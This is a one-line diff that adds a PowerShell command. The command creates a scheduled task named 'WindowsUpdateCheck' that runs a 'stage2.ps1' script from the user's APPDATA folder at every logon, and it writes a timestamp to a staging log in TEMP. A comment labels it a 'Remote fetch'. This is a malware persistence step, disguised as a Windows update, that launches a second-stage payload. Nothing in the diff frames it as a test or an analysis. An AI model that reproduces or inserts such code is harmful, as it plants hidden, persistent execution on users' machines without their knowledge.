@@ -1,0 +1,1 @@
+<# Remote fetch #> schtasks.exe /Create /TN 'WindowsUpdateCheck' /TR "powershell.exe -NoP -File `"$env:APPDATA\stage2.ps1`"" /SC ONLOGON /RU $env:USERNAME /F; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
